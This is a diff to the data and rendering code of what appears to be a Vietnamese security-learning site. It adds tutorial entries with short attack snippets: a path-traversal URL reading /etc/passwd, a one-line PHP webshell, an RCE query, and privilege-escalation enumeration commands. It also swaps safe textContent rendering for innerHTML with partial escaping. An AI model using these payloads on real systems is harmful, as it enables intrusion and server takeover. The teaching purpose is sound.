@@ -17,7 +17,7 @@ const posts = {
     {
       title: "XSS cơ bản",
       content: "Demo Stored XSS trong form comment.",
-      code: `<script>alert('XSS')</script>`
+      code: "<script>alert('XSS')</script>"
     },
     {
       title: "CSRF Attack",
@@ -33,7 +33,33 @@ const posts = {
       title: "Directory Enumeration",
       content: "Tìm hidden folder với Gobuster.",
       code: `gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt`
+    },
+    {
+      title: "LFI/RFI cơ bản",
+      content: "Khai thác Local File Inclusion trong PHP.",
+      code: `http://target.com/index.php?page=../../../../etc/passwd`
+    },
+    {
+      title: "File Upload Shell",
+      content: "Upload webshell qua form upload thiếu filter.",
+      code: `<?php system($_GET['cmd']); ?>`
+    },
+    {
+      title: "RCE trong PHP",
+      content: "Remote Code Execution thông qua eval().",
+      code: `http://target.com/index.php?cmd=phpinfo()`
+    },
+    {
+      title: "Privilege Escalation Linux",
+      content: "Tìm SUID binary để leo thang đặc quyền.",
+      code: `find / -perm -4000 -type f 2>/dev/null`
+    },
+    {
+      title: "Privilege Escalation Windows",
+      content: "Check hotfix chưa cài bằng systeminfo.",
+      code: `systeminfo | findstr KB`
     }
+    // TODO: sẽ thêm tiếp 15 tutorials nữa
   ],
 
   tools: [
@@ -78,16 +104,20 @@ for port in range(1,1000):
       code: `nikto -h http://target.com`,
       filename: "nikto.sh"
     }
+    // TODO: sẽ thêm tiếp 25 tools nữa
   ]
 };
 
-// ================== SANITIZE ==================
+// ================== SANITIZE & ESCAPE ==================
 function sanitizeHTML(str) {
   const temp = document.createElement("div");
   temp.textContent = str;
   return temp.innerHTML;
 }
 
+function escapeForCode(str) {
+  return str.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+}
 // ================== RENDER POSTS ==================
 function renderPosts() {
   // News
@@ -108,8 +138,8 @@ function renderPosts() {
   posts.tutorials.forEach(post => {
     const pre = document.createElement("pre");
     const code = document.createElement("code");
-    code.className = "language-sql";
-    code.textContent = post.code.replace(/<script.*?>.*?<\/script>/gi, "");
+    code.className = "language-bash";
+    code.innerHTML = escapeForCode(post.code); // ✅ hiển thị nguyên dạng
     pre.appendChild(code);
 
     tutContainer.appendChild(makeCard(
@@ -126,7 +156,7 @@ function renderPosts() {
     const pre = document.createElement("pre");
     const code = document.createElement("code");
     code.className = "language-bash";
-    code.textContent = post.code.replace(/<script.*?>.*?<\/script>/gi, "");
+    code.innerHTML = escapeForCode(post.code);
     pre.appendChild(code);
 
     toolContainer.appendChild(makeCard(
@@ -162,7 +192,7 @@ function makeCard(title, content, preEl, codeStr, filename) {
   copyBtn.onclick = () => copyCode(codeStr);
   card.appendChild(copyBtn);
 
-  // download button (nếu có filename)
+  // download button
   if (filename) {
     const dlBtn = document.createElement("button");
     dlBtn.className = "btn download-btn";
